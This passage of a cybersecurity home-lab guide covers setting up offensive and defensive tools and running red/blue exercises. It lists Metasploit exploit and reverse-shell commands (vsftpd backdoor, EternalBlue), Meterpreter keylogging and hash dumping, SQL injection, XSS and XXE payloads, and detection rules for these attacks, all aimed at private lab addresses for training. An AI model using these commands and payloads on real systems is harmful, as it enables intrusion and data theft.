**Analyzing Traffic:**
```
1. Capture traffic during nmap scan
2. Apply display filter: nmap
3. Analyze TCP handshake (SYN, SYN-ACK, ACK)
4. Look for unusual ports or services
5. Export objects (File → Export Objects)
```

#### Learning Objectives - Wireshark

- [ ] Capture network packets on lab network
- [ ] Apply capture and display filters
- [ ] Analyze TCP/IP protocols
- [ ] Identify suspicious network traffic

---

### 8.3 Metasploit Installation and Usage

#### Installation

**Kali Linux:**
```
bash
# Pre-installed
msfconsole --version

# Update Metasploit
sudo apt update && sudo apt install metasploit-framework
```

**Standalone Installation:**
```
bash
# Install from GitHub
cd /opt
sudo git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
sudo ./msfconsole

# First-time setup
msf6 > db_status
msf6 > workspace -a lab
```

#### Metasploit Basics

**Starting Metasploit:**
```
bash
sudo msfconsole
# or
msfconsole -q  # Quiet mode
```

**Key Commands:**
```
bash
# Search for exploits
search type:exploit name:ftp
search cve:2023
search platform:windows

# Select and use an exploit
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 192.168.100.30
set RPORT 21
exploit

# Use a scanner
use auxiliary/scanner/ftp/ftp_version
show options
set RHOSTS 192.168.100.0/24
run

# Use payload
set payload cmd/unix/reverse_netcat
set LHOST 192.168.100.10
set LPORT 4444
```

**Common Metasploit Commands:**

| Command | Description |
|---------|-------------|
| `show exploits` | List all exploits |
| `show payloads` | List all payloads |
| `show options` | Show configuration options |
| `show targets` | List target systems |
| `set RHOSTS` | Set target IP(s) |
| `set LHOST` | Set local (attacker) IP |
| `set RPORT` | Set target port |
| `exploit` | Run the exploit |
| `check` | Check if target is vulnerable |
| `sessions` | List active sessions |
| `sessions -i 1` | Interact with session 1 |

**Common Exploits for Lab:**

```
bash
# VSFTPD Backdoor (Metasploitable)
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.100.30
exploit

# EternalBlue (Windows 7/2008)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.100.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.100.10
exploit

# SSH Brute Force (Ubuntu/Metasploitable)
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.100.40
set USERNAME labuser
set PASSWORD LabPass123!
run
```

#### Meterpreter Commands

```
bash
# After getting a Meterpreter shell:
sysinfo                    # System information
getuid                     # Current user
ipconfig                   # Network info
pwd                        # Current directory
cd /                       # Change directory
ls                         # List files
download /etc/passwd       # Download file
upload /tmp/shell.exe      # Upload file
shell                     # Get interactive shell
screenshot                # Take screenshot
keyscan_start             # Start keylogging
keyscan_dump              # Dump keystrokes
webcam_list               # List webcams
webcam_snap               # Take webcam picture
hashdump                  # Dump password hashes
```

#### Learning Objectives - Metasploit

- [ ] Navigate Metasploit framework
- [ ] Use auxiliary modules for scanning
- [ ] Execute exploits against vulnerable targets
- [ ] Work with Meterpreter payloads
- [ ] Conduct post-exploitation activities

---

### 8.4 Burp Suite Installation and Usage

#### Installation

**Kali Linux:**
```
bash
# Pre-installed
burpsuite --version
# or
cd /usr/bin/burpsuite
java -jar burpsuite.jar
```

**Standalone:**
```
bash
# Download from: https://portswigger.net/burp/releases
# Download Community or Professional

# Install Java if needed
sudo apt install default-jdk

# Run Burp Suite
java -jar burpsuite_community.jar
```

**Windows:**
```
powershell
# Download from: https://portswigger.net/burp/releases
# Run installer
# Launch Burp Suite
```

#### Burp Suite Configuration

**Configure Browser (Firefox):**
```
1. Firefox → Settings → Network Settings
2. Manual proxy configuration:
   HTTP Proxy: 127.0.0.1
   Port: 8080
3. Check "Use this proxy for all protocols"
4. Go to: http://burpsuite
5. Download CA Certificate
6. Import certificate:
   Firefox → Privacy & Security → Certificates
   View Certificates → Import
```

**Configure Proxy in Burp Suite:**
```
1. Proxy → Options
2. Ensure "Proxy Listeners" is running on 127.0.0.1:8080
3. Request Handling → Support invisible proxy: ON
```

#### Basic Burp Suite Workflow

**Step 1: Configure Target Scope**
```
1. Target → Site Map → Scope
2. Add: ^http://192\.168\.100\.\d+.*$
3. Enable "Use advanced scope control"
```

**Step 2: Capture Requests**
```
1. Proxy → Intercept → Intercept is ON
2. Browse to target application
3. Review captured requests
4. Forward or Drop
```

**Step 3: Spider Application**
```
1. Target → Site Map
2. Right-click target → Spider this host
3. Review discovered URLs
```

**Step 4: Scan for Vulnerabilities**
```
1. Scanner → Live Tasks → New scan
2. Enter URL
3. Select scan type (Crawl and Audit)
4. Review results
```

**Common Burp Suite Tools:**

| Tool | Purpose |
|------|---------|
| Proxy | Intercept/modify HTTP traffic |
| Repeater | Manual request modification |
| Intruder | Automated attacks/fuzzing |
| Sequencer | Analyze token randomness |
| Decoder | Encode/decode data |
| Comparer | Compare responses |

#### Practice Exercises

1. Intercept HTTP requests from DVWA
2. Use Repeater to exploit SQL injection
3. Use Intruder for password brute-forcing
4. Analyze session tokens with Sequencer

---

### 8.5 OWASP ZAP Installation and Usage

#### Installation

**Kali Linux:**
```
bash
# Pre-installed
zap.sh
```

**Ubuntu/Debian:**
```
bash
# Install ZAP
sudo apt install zaproxy

# Or download standalone
wget https://github.com/zaproxy/zaproxy/releases/download/v2.14.0/ZAP_2.14.0_unix.sh
chmod +x ZAP_2.14.0_unix.sh
./ZAP_2.14.0_unix.sh
```

**Windows:**
```
powershell
# Download from: https://www.zaproxy.org/download/
# Run installer
```

#### ZAP Configuration

**Configure Proxy:**
```
1. Tools → Options → Local Proxy
2. Address: 127.0.0.1
3. Port: 8080
4. Make sure browser uses this proxy
```

**Configure Browser:**
```
Firefox → Settings → Network Settings:
Manual proxy: 127.0.0.1 port 8080
```

#### Basic ZAP Workflow

**Quick Start:**
```
1. Click "Automated Scan"
2. Enter target URL: http://192.168.100.40/DVWA
3. Click "Attack"
4. Review alerts
```

**Manual Testing:**
```
1. Go to browser, configure proxy
2. Browse target site manually
3. ZAP captures all traffic in Site Tree
4. Right-click → Attack → Spider
5. Review results in Alerts tab
```

**ZAP Tools:**

| Tool | Description |
|------|-------------|
| Spider | Discover hidden pages |
| Active Scan | Test for vulnerabilities |
| Fuzzer | Test for bugs |
| Port Scan | Network scanning |
| Report | Generate security reports |

#### Learning Objectives - ZAP

- [ ] Configure ZAP as proxy
- [ ] Spider web applications
- [ ] Run automated scans
- [ ] Analyze vulnerability reports

---

### 8.6 Splunk Installation and Configuration

#### Installation

**Download Splunk:**
```
bash
# Free Splunk Enterprise
wget -O splunk-9.1.1-64bit.msi "https://download.splunk.com/products/splunk/releases/9.1.1/win64/splunk-9.1.1-64bit.msi"

# Or Linux:
wget -O splunk-9.1.1-64bit-linux.tgz "https://download.splunk.com/products/splunk/releases/9.1.1/linux/splunk-9.1.1-64bit-linux-2.6.tgz"
```

**Install on Ubuntu:**
```
bash
# Extract
sudo tar -xzf splunk-9.1.1-64bit-linux-2.6.tgz -C /opt

# Start Splunk
cd /opt/splunk/bin
sudo ./splunk start

# Accept license
# Create admin credentials
# Access: https://localhost:8000
```

**Install on Windows:**
```
1. Run MSI installer
2. Accept license
3. Select installation directory
4. Complete installation
5. Start Splunk from Start Menu
6. Open: http://localhost:8000
```

#### Configuring Splunk

**Add Network Inputs:**
```
1. Settings → Data Inputs → Network → TCP
2. Add new:
   Port: 514 (syslog)
   Source name: network
3. Next → Review → Submit
```

**Add File Monitoring:**
```
1. Settings → Data Inputs → Files & Directories
2. Add new:
   Browse to: /var/log/auth.log (Linux)
   or C:\Windows\System32\LogFiles (Windows)
3. Set sourcetype
4. Submit
```

**Configure Forwarders (Optional):**
```
bash
# On target systems, install forwarder
# Download from Splunk

# Configure forwarder
cd /opt/splunkforwarder/bin
./splunk add monitor /var/log/ -index main
./splunk add server 192.168.100.50:9997
```

#### Creating Dashboards

**Create Custom Dashboard:**
```
1. Search & Reporting → Save Search As → Dashboard Panel
2. Create new dashboard
3. Add panels with searches
4. Save dashboard
```

**Sample Searches:**
```
spl
# Failed SSH attempts
index=main sourcetype=sshd "Failed password"

# Successful logins
index=main sourcetype=syslog "Accepted password"

# Network connections
index=main src_ip=192.168.100.* | stats count by dest_ip

# Web attacks
index=main sourcetype=access_combined | search "<script>"
```

#### Learning Objectives - Splunk

- [ ] Install and configure Splunk
- [ ] Create data inputs
- [ ] Build search queries
- [ ] Create dashboards

---

### 8.7 ELK Stack Installation

#### Installation (Elasticsearch, Logstash, Kibana)

**Method 1: All-in-One Script (Recommended for Lab)**

```
bash
# Download ELK lab script
wget https://raw.githubusercontent.com/elastic/examples/master/ML/Sharded/network_requests_visualization.sh

# Or use official installation
```

**Method 2: Manual Installation**

**Install Elasticsearch:**
```
bash
# Add Elastic repository
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -
echo "deb https://artifacts.elastic.co/packages/8.x/apt stable main" | sudo tee /etc/apt/sources.list.d/elastic-8.x.list
sudo apt update

# Install Elasticsearch
sudo apt install elasticsearch

# Configure
sudo nano /etc/elasticsearch/elasticsearch.yml

# Set:
cluster.name: lab-elk
network.host: 0.0.0.0
discovery.type: single-node

# Start Elasticsearch
sudo systemctl enable elasticsearch
sudo systemctl start elasticsearch
```

**Install Kibana:**
```
bash
sudo apt install kibana

# Configure
sudo nano /etc/kibana/kibana.yml

# Set:
server.host: "0.0.0.0"
elasticsearch.hosts: ["http://localhost:9200"]

# Start Kibana
sudo systemctl enable kibana
sudo systemctl start kibana
```

**Install Logstash:**
```
bash
sudo apt install logstash

# Create configuration
sudo nano /etc/logstash/conf.d/01-labs-input.conf

input {
  beats {
    port => 5044
  }
  syslog {
    port => 514
  }
}

filter {
  if [type] == "syslog" {
    grok {
      match => { "message" => "%{SYSLOGTIMESTAMP:syslog_timestamp} %{SYSLOGHOST:syslog_hostname} %{DATA:syslog_program}(?:\[%{POSINT:syslog_pid}\])?: %{GREEDYDATA:syslog_message}" }
    }
    date {
      match => [ "syslog_timestamp", "MMM  d HH:mm:ss", "MMM dd HH:mm:ss" ]
    }
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    manage_template => false
    index => "%{[@metadata][beat]}-%{+YYYY.MM.dd}"
  }
}

# Start Logstash
sudo systemctl enable logstash
sudo systemctl start logstash
```

**Access Kibana:**
```
URL: http://192.168.100.50:5601
Username: elastic
Password: (set during installation)
```

#### Configuring Filebeat (on target VMs)

**On Kali Linux:**
```
bash
sudo apt install filebeat

# Configure
sudo nano /etc/filebeat/filebeat.yml

filebeat.inputs:
- type: log
  paths:
    - /var/log/auth.log
    - /var/log/syslog
  fields:
    type: syslog

output.logstash:
  hosts: ["192.168.100.50:5044"]

# Enable modules
sudo filebeat modules enable system

# Start Filebeat
sudo systemctl enable filebeat
sudo systemctl start filebeat
```

#### Learning Objectives - ELK

- [ ] Install ELK stack components
- [ ] Configure data inputs
- [ ] Create visualizations
- [ ] Build dashboards

---

### 8.8 Snort Installation and Configuration

#### Installation

**Ubuntu/Debian:**
```
bash
# Install dependencies
sudo apt install -y build-essential libpcap-dev libpcre3-dev libdnet-dev flex bison zlib1g-dev liblzma-dev libssl-dev

# Download Snort
wget https://www.snort.org/downloads/snort/daq-2.0.7.tar.gz
wget https://www.snort.org/downloads/snort/snort-2.9.20.tar.gz

# Install DAQ
tar -xzf daq-2.0.7.tar.gz
cd daq-2.0.7
./configure && make && sudo make install
cd ..

# Install Snort
tar -xzf snort-2.9.20.tar.gz
cd snort-2.9.20
./configure --enable-sourcefire && make && sudo make install
cd ..

# Setup symbolic links
sudo ldconfig
sudo ln -s /usr/local/bin/snort /usr/sbin/snort
```

**Configure Snort:**
```
bash
# Create directories
sudo mkdir /etc/snort
sudo mkdir /etc/snort/rules
sudo mkdir /var/log/snort

# Download community rules
wget https://www.snort.org/rules/community -O community.tar.gz
sudo tar -xzf community.tar.gz -C /etc/snort
rm community.tar.gz

# Create snort.conf
sudo cp /etc/snort/snort.conf /etc/snort/snort.conf.backup
sudo nano /etc/snort/snort.conf

# Key changes:
# ipvar HOME_NET 192.168.100.0/24
# ipvar EXTERNAL_NET any
# var RULE_PATH /etc/snort/rules
# var SO_RULE_PATH /etc/snort/so_rules
# var PREPROC_RULES /etc/snort/preproc_rules
# var WHITE_LIST_PATH /etc/snort/rules
# var BLACK_LIST_PATH /etc/snort/rules
# output unified2: filename snort.log, limit 128
```

**Create Test Rule:**
```
bash
# Create local.rules
sudo nano /etc/snort/rules/local.rules

# Add:
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping"; sid:1000001; rev:1;)

# Include in snort.conf
include $RULE_PATH/local.rules
```

**Test Snort:**
```
bash
# Test configuration
sudo snort -T -c /etc/snort/snort.conf

# Run Snort (IDS mode)
sudo snort -c /etc/snort/snort.conf -i eth0

# Run Snort (Packet Capture mode)
sudo snort -i eth0
```

#### Learning Objectives - Snort

- [ ] Install and configure Snort
- [ ] Write custom detection rules
- [ ] Analyze Snort alerts
- [ ] Monitor network traffic

---

### 8.9 Suricata Installation

#### Installation

**Ubuntu/Debian:**
```
bash
# Add Suricata repository
sudo add-apt-repository ppa:oisf/suricata-stable
sudo apt update
sudo apt install suricata

# Verify installation
suricata --version
```

#### Configuration

```
bash
# Create configuration
sudo cp /etc/suricata/suricata.yaml /etc/suricata/suricata.yaml.backup
sudo nano /etc/suricata/suricata.yaml

# Key settings:
# home-net: [192.168.100.0/24]
# host-mode: auto
# default-log-dir: /var/log/suricata/
```

**Create Rules:**
```
bash
# Edit rules
sudo nano /etc/suricata/rules/local.rules

# Add rules:
alert icmp any any -> $HOME_NET any (msg:"ICMP Detected"; sid:1000001; rev:1;)
alert tcp any any -> $HOME_NET 80 (msg:"HTTP Traffic"; sid:1000002; rev:1;)
```

**Test Suricata:**
```bash
# Test configuration
sudo suricata -T -c /etc/suricata/suricata.yaml

# Run Suricata
sudo suricata -c /etc/suricata/suricata.yaml -i eth0

# View logs
sudo tail -f /var/log/suricata/fast.log
```

---

## 9. Active Directory Lab Setup

### Purpose

The Active Directory lab provides a realistic Windows domain environment for:
- Learning Active Directory attacks
- Practicing privilege escalation
- Understanding Kerberos authentication
- Testing lateral movement techniques

### Components

| Component | Purpose | IP Address |
|-----------|---------|------------|
| Windows Server 2019/2022 | Domain Controller | 192.168.100.60 |
| Windows 10 Client | Member workstation | 192.168.100.61 |
| Windows 11 Client | Member workstation | 192.168.100.62 |

### Step-by-Step AD Lab Setup

#### Step 1: Install Windows Server

**Download:**
- Windows Server 2019/2022 Evaluation: https://www.microsoft.com/en-us/evalcenter/download-windows-server

**Create VM:**
```
1. New VM: Windows Server 2019
2. CPU: 2-4 cores
3. RAM: 4-8 GB
4. Storage: 60 GB
5. Network: Host-only (192.168.100.0/24)
```

**Install Windows Server:**
```
1. Boot from ISO
2. Select: Windows Server 2019 Standard (Desktop Experience)
3. Custom installation
4. Select drive → Next
5. Set Administrator password
6. Complete installation
```

#### Step 2: Configure Static IP

```
powershell
# Open Network and Sharing Center
# Ethernet → Properties → IPv4

IP Address: 192.168.100.60
Subnet Mask: 255.255.255.0
Preferred DNS: 192.168.100.60 (itself)
```

#### Step 3: Install Active Directory Domain Services

```
powershell
# Open Server Manager
# Add roles and features

# Select: Active Directory Domain Services
# Click Next → Install

# After installation, promote server to DC
# Click the notification flag (yellow)
# Click "Promote this server to a domain controller"

# Deployment configuration:
#   Add a new forest
#   Root domain name: lab.local

# Domain Controller Options:
#   Forest functional level: Windows Server 2019
#   Domain functional level: Windows Server 2019
#   Check: DNS Server
#   Global Catalog: Checked

# Credentials:
#   Administrator password: ComplexPassword123!

# Click Install → Server will restart
```

#### Step 4: Create Test Users

```powershell
# Login as LAB\Administrator
# Open Active Directory Users and Computers

# Right-click Users → New → User
# Create users:
#   - user1 (Password: User1Pass123!)
#   - user2 (Password: User2Pass123!)
#   - admin (Password: AdminPass123!) → Add to Domain Admins

# Create OU structure:
#   - IT (Organizational Unit)
#   - Sales (Organizational Unit)
#   - Finance (Organizational Unit)
```

#### Step 5: Join Windows 10/11 to Domain

**On Windows 10 Client:**
```
powershell
# Configure network
IP Address: 192.168.100.61
Subnet Mask: 255.255.255.0
Gateway: 192.168.100.60
DNS: 192.168.100.60

# Rename computer
sysdm.cpl → Computer Name → Change
Computer name: WIN10-CLIENT1
Member of: Domain
Domain: lab.local

# Restart and login with domain user
# Username: LAB\user1
# Password: User1Pass123!
```

#### Step 6: Install Vulnerabilities for Practice

```
powershell
# Install weak service permissions
# Configure misconfigured SMB
# Enable LDAPS
# Add vulnerable GPOs

# For testing, add user to highly privileged groups
# Users → Properties → Member Of → Add "Domain Admins"
```

### AD Attack Scenarios

**Practice Exercises:**
1. Enumerate AD users and groups with PowerView
2. Kerberoasting attack
3. AS-REP Roasting
4. Pass-the-Hash
5. Golden Ticket attack
6. DCSync attack
7. ACL abuse

---

## 10. Basic SOC Monitoring Lab

### Purpose

The SOC monitoring lab provides hands-on experience with:
- Security monitoring and alerting
- Log analysis and correlation
- Threat detection
- Incident response procedures

### Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    LAB NETWORK (192.168.100.0/24)              │
│                                                                  │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐      │
│  │   Kali       │    │  Windows 10  │    │Metasploitable│      │
│  │  (Attacker)  │───►│  (Target)   │◄───│  (Target)    │      │
│  └──────────────┘    └──────────────┘    └──────────────┘      │
│         │                   │                   │              │
│         └───────────────────┴───────────────────┘              │
│                             │                                   │
│                             ▼                                   │
│                    ┌──────────────────┐                       │
│                    │   Security VM     │                       │
│                    │  (ELK / Splunk)  │                       │
│                    │  (Snort/Suricata)│                       │
│                    └──────────────────┘                       │
└─────────────────────────────────────────────────────────────────┘
```

### Setting Up Monitoring

#### Step 1: Configure Windows Event Forwarding

**On Windows 10 Target:**
```
powershell
# Open Group Policy Management
gpmc.msc

# Create GPO: Security Logging
# Computer Configuration → Policies → Windows Settings
#   → Security Settings → Advanced Audit Policy
#     Enable:
#       - Logon events (Success, Failure)
#       - Object access (File, Registry)
#       - Policy change
#       - Privilege use
#       - Process tracking
#       - System events
```

#### Step 2: Install Windows Event Forwarder

```
powershell
# On Security VM, configure WEF
wevtutil sl Security /q:true /ca:Success,Failure
wevtutil sl System /q:true /ca:Success,Failure

# Configure subscription
# Using Windows Event Collector
wecutil qc
```

#### Step 3: Create Detection Rules

**Splunk Search for Brute Force:**
```
spl
index=windows_logs sourcetype=security EventCode=4625 
| stats count by Account_Name, src_ip 
| where count > 5
```

**Splunk Search for Successful Login:**
```
spl
index=windows_logs sourcetype=security EventCode=4624 
| stats latest(_time) as last_login by Account_Name
```

**Splunk Search for PowerShell Empire:**
```
spl
index=windows_logs EventCode=4104 
| search "powershell" "downloadstring" OR "downloadfile" OR "iex"
```

### Setting Up Snort/Suricata Alerts

**Configure Snort Rules for Lab:**
```
bash
# /etc/snort/rules/lab-alerts.rules

# Detect Nmap scans
alert tcp any any -> $HOME_NET any (msg:"Nmap Scan Detected"; flags:S; sid:1000001; rev:1;)

# Detect SMB exploit attempts
alert tcp any any -> $HOME_NET 445 (msg:"SMB Exploit Attempt"; content:"|00 00 00 00 ff 53 4d 42|"; sid:1000002; rev:1;)

# Detect Metasploit reverse shell
alert tcp any any -> $HOME_NET any (msg:"Metasploit Payload"; content:"meterpreter"; sid:1000003; rev:1;)

# Detect port scanning
alert tcp any any -> $HOME_NET any (msg:"Possible Port Scan"; threshold:type threshold, track by_src, count 20, seconds 10; sid:1000004; rev:1;)
```

### SOC Dashboard Layout

**Essential Dashboard Panels:**

| Panel | Description | Search |
|-------|-------------|--------|
| Failed Logins | Brute force attempts | `EventCode=4625` |
| Successful Logins | Normal activity | `EventCode=4624` |
| Top Talkers | Most active IPs | `stats by src_ip` |
| Attack Timeline | Attack activity | Alert history |
| Network Alerts | IDS alerts | `Snort alerts` |

### Practice Scenarios

1. **Detect Nmap SYN scan** - View Snort logs during scan
2. **Identify failed SSH logins** - Analyze syslog
3. **Detect PowerShell download** - Monitor Windows logs
4. **Alert on file changes** - Configure file integrity monitoring

---

## 11. Vulnerability Scanning Lab

### Purpose

Learn to identify and assess vulnerabilities using:
- Network vulnerability scanners
- Web application scanners
- Open-source tools
- Commercial tools (trial versions)

### Nmap Vulnerability Scanning

**Nmap NSE Scripts:**
```
bash
# Scan for vulnerabilities
nmap --script vuln 192.168.100.30

# Scan specific categories
nmap --script "vuln and intrusive" 192.168.100.30

# Check for specific vulnerabilities
nmap --script http-vuln* 192.168.100.30
nmap --script smb-vuln* 192.168.100.20

# Full vulnerability assessment
nmap -A --script vuln 192.168.100.0/24 -oA vuln_scan
```

### OpenVAS Installation

**Install OpenVAS:**
```
bash
# Ubuntu
sudo add-apt-repository ppa:mrazavi/openvas
sudo apt update
sudo apt install openvas

# Initial setup
sudo openvas-setup

# Access OpenVAS
# https://localhost:9392
```

**Configure and Run Scan:**
```
1. Login to OpenVAS
2. Scans → Tasks → New Task
3. Configure:
   - Name: Lab Network Scan
   - Targets: 192.168.100.0/24
   - Scan Config: Full and fast
4. Start scan
5. View results
```

### Nessus Installation (Trial)

**Download:**
```
bash
# Download Nessus (free for personal use)
wget https://www.tenable.com/downloads/nessus?loginAttempted=true

# Install
sudo dpkg -i Nessus-*.deb

# Start Nessus
sudo systemctl start nessusd
# Access: https://localhost:8834
```

### Web Vulnerability Scanning

**Nikto:**
```
bash
# Install
sudo apt install nikto

# Scan target
nikto -h http://192.168.100.40/DVWA
nikto -h http://192.168.100.30 -p 80

# Full scan with output
nikto -h 192.168.100.40 -o scan_report.html -Format html
```

**OWASP ZAP Scanning:**
```
1. Configure ZAP proxy in browser
2. Spider target application
3. Active Scan
4. Generate report: Report → HTML
```

### Vulnerability Reporting

**Sample Report Structure:**
```
1. Executive Summary
2. Scope
3. Methodology
4. Findings
   - Critical
   - High
   - Medium
   - Low
   - Informational
5. Recommendations
6. Appendix
```

---

## 12. Web Application Testing Lab

### Purpose

Practice web application security testing:
- OWASP Top 10 vulnerabilities
- Manual testing techniques
- Automated scanning
- Report writing

### Lab Setup

**Install Vulnerable Applications:**

**1. DVWA (Damn Vulnerable Web Application):**
```
bash
# Already installed in Ubuntu Server section
# Access: http://192.168.100.40/DVWA
# Login: admin / password
```

**2. OWASP Juice Shop:**
```
bash
# Install Node.js
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs

# Install Juice Shop
sudo npm install -g @juice-shop/juice-shop
juice-shop

# Access: http://localhost:3000
```

**3. WebGoat:**
```
bash
# Install Java
sudo apt install default-jdk

# Download WebGoat
wget https://github.com/OWASP/WebGoat/releases/download/v2023.4/webgoat-server-2023.4.jar

# Run
java -jar webgoat-server-2023.4.jar

# Access: http://localhost:8080/WebGoat
```

### OWASP Top 10 Testing

**A1: Injection**
```
bash
# SQL Injection test in DVWA
# Low Security:
' OR '1'='1

# Medium Security:
' OR 1=1--

# Bypass with UNION:
' UNION SELECT database(),user(),version()--
```

**A2: Broken Authentication**
```
bash
# Test session management
# Check cookie security flags
# Test password reset vulnerabilities
```

**A3: Sensitive Data Exposure**
```
bash
# Check for sensitive data in URLs
# Look for unencrypted data in responses
# Test for backup files
```

**A4: XML External Entities (XXE)**
```
xml
# Test XXE
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**A5: Broken Access Control**
```
bash
# Test IDOR
# Change IDs in URLs to access other users' data
# Test horizontal/vertical privilege escalation
```

**A6: Security Misconfiguration**
```
bash
# Check for default credentials
# Look for verbose error messages
# Check security headers
```

**A7: XSS (Cross-Site Scripting)**
```
javascript
// Reflected XSS
<script>alert('XSS')</script>

// Stored XSS
<img src=x onerror=alert('XSS')>

// DOM XSS
javascript:alert('XSS')
```

**A8: Insecure Deserialization**
```
python
# Test with Python pickle
import pickle
# Craft malicious payload
```

**A9: Using Components with Known Vulnerabilities**
```
bash
# Check versions
nmap --script=vuln target
# Use nikto
nikto -h target
```

**A10: Insufficient Logging**
```
bash
# Test if failed logins are logged
# Check for logging of sensitive data
# Verify log integrity
```

### Burp Suite Practice

**Manual Testing with Repeater:**
```
1. Intercept request in Proxy
2. Send to Repeater
3. Modify request
4. Send and analyze response
5. Document findings
```

**Intruder for Fuzzing:**
```
1. Send request to Intruder
2. Set payload positions
3. Configure wordlists
4. Start attack
5. Analyze results
```

---

## 13. Log Analysis Practice

### Purpose

Develop log analysis skills:
- Parse various log formats
- Identify malicious activity
- Correlation across sources
- Timeline analysis

### Log Sources

**Linux System Logs:**

| Log File | Description |
|----------|-------------|
| /var/log/auth.log | Authentication logs |
| /var/log/syslog | System messages |
| /var/log/kern.log | Kernel messages |
| /var/log/apache2/access.log | Web server access |
| /var/log/apache2/error.log | Web server errors |

**Windows Event Logs:**

| Event ID | Description |
|----------|-------------|
| 4624 | Successful logon |
| 4625 | Failed logon |
| 4634 | Logoff |
| 4672 | Special privileges assigned |
| 4720 | User account created |
| 4726 | User account deleted |
| 4688 | Process created |
| 4698 | Scheduled task created |

### Log Analysis Exercises

**Exercise 1: Detect Brute Force Attack**
```
bash
# Linux: Check auth.log for failed logins
grep "Failed password" /var/log/auth.log

# Windows: Check Security log
wevtutil qe Security /c:10 /f:text /q:"Event[System[(EventID=4625)]]"
```

**Exercise 2: Find Privilege Escalation**
```
bash
# Linux: Check sudo usage
grep "sudo:" /var/log/auth.log

# Windows: Check for special privileges
wevtutil qe Security /c:10 /f:text /q:"Event[System[(EventID=4672)]]"
```

**Exercise 3: Timeline Analysis**
```
bash
# Create timeline from multiple logs
for f in /var/log/{auth.log,syslog,kern.log}; do
  grep "$1" $f
done | sort
```

### SIEM Integration

**Import Logs to ELK:**
```
1. Configure Filebeat on target
2. Add log paths to filebeat.yml
3. Start Filebeat service
4. Access Kibana → Discover
5. Create index pattern
6. Build visualizations
```

---

## 14. Malware Analysis Basics Lab

### Purpose

Introduction to malware analysis:
- Static analysis
- Dynamic analysis
- Sandbox analysis
- Reporting

### Lab Setup

**Isolation Requirements:**
```
- NO internet connection for analysis VM
- Use Host-only network
- Snapshot before analysis
- Revert after each analysis
```

### Creating Analysis VM

```
bash
# Create VM with:
# - Windows 7 (older malware)
# - RAM: 2 GB
# - Network: Host-only (DISCONNECT after setup)
# - Install: Python, OllyDbg, Process Hacker
# - Snapshot: "Clean"
```

### Static Analysis Tools

**File Analysis:**
```
bash
# Install pefile
pip install pefile

# Analyze PE file
python3
import pefile
pe = pefile.PE('malware.exe')
print(pe.IMAGE_DOS_HEADER)
print(pe.OPTIONAL_HEADER)
```

**String Extraction:**
```
bash
# Extract strings
strings malware.exe > strings.txt
strings -n 10 malware.exe  # Min 10 chars

# Search for suspicious strings
grep -i "http\|password\|cmd\|shell" strings.txt
```

**Hash Calculation:**
```
bash
# Calculate hashes
md5sum malware.exe
sha1sum malware.exe
sha256sum malware.exe

# Check against VirusTotal
# Upload hash to virustotal.com
```

### Dynamic Analysis

**Network Monitoring:**
```
bash
# Monitor network connections
tcpdump -i eth0 -w capture.pcap
# or
Wireshark

# Monitor DNS requests
sudo tcpdump -i eth0 -n port 53
```

**Process Monitoring:**
```
powershell
# Use Process Hacker
# https://processhacker.sourceforge.io/

# Monitor:
# - New processes
# - Network connections
# - File operations
# - Registry modifications
```

**Regshot:**
```
powershell
# Use Regshot
# https://github.com/Siwen/Regshot
# 1. Take snapshot 1
# 2. Run malware
# 3. Take snapshot 2
# 4. Compare
```

### Online Sandboxes

**Free Online Analysis:**
- https://any.run
- https://www.hybrid-analysis.com
- https://zeltser.com/malware-analysis-sandbox/

### Safety Precautions

1. **ALWAYS** analyze in isolated VM
2. **NEVER** run malware on host
3. **DISCONNECT** network before analysis
4. **SNAPSHOT** before running malware
5. **DOCUMENT** all findings
6. **SANITIZE** samples before sharing

---

## 15. Blue Team + Red Team Simulation Exercises

### Purpose

Combine offensive and defensive skills:
- Realistic attack scenarios
- Detection and response
- Full attack lifecycle
- Team collaboration

### Exercise 1: Network Reconnaissance

**Red Team (Attacker):**
```
bash
# Perform reconnaissance
nmap -sS -sV -O 192.168.100.0/24
nmap --script vuln 192.168.100.30

# Document findings
# Identify:
# - Open ports
# - Services
# - Vulnerabilities
```

**Blue Team (Defender):**
```
bash
# Monitor with Snort/Suricata
tail -f /var/log/suricata/fast.log

# Analyze in Splunk
# Search for port scanning patterns
index=suricata "Potential" | stats count by src_ip
```

### Exercise 2: Exploitation and Detection

**Red Team:**
```
bash
# Exploit Metasploitable
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.100.30
exploit

# Escalate privileges
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Blue Team:**
```
bash
# Detect exploitation
# Check Snort alerts
cat /var/log/suricata/fast.log | grep 192.168.100.30

# Analyze in Splunk
# Search for suspicious processes
index=syslog | search "python\|bash" | stats by host

# Check network connections
netstat -antp | grep ESTABLISHED
```

### Exercise 3: Web Application Attack

**Red Team:**
```
bash
# Attack DVWA
# 1. Setup Burp Suite
# 2. SQL Injection
# 3. XSS reflected/stored
# 4. CSRF
# 5. File inclusion
```

**Blue Team:**
```
bash
# Monitor web logs
tail -f /var/log/apache2/access.log

# Search for attack patterns
grep -E "SELECT|UNION|<script>|../../" /var/log/apache2/access.log

# Create alerts in ELK
# Alert on SQL injection attempts
```

### Exercise 4: Full Red Team Engagement

**Scenario:** Compromise entire lab network

**Phases:**
1. **Reconnaissance** - Scan network, identify targets
2. **Weaponization** - Prepare exploits
3. **Delivery** - Phishing/USB/social engineering
4. **Exploitation** - Gain initial access
5. **Installation** - Install persistence
6. **Command & Control** - Establish C2
7. **Actions on Objectives** - Achieve mission

### Exercise 5: Blue Team Response

**Incident Response Steps:**

1. **Detection** - Identify the threat
2. **Containment** - Isolate affected systems
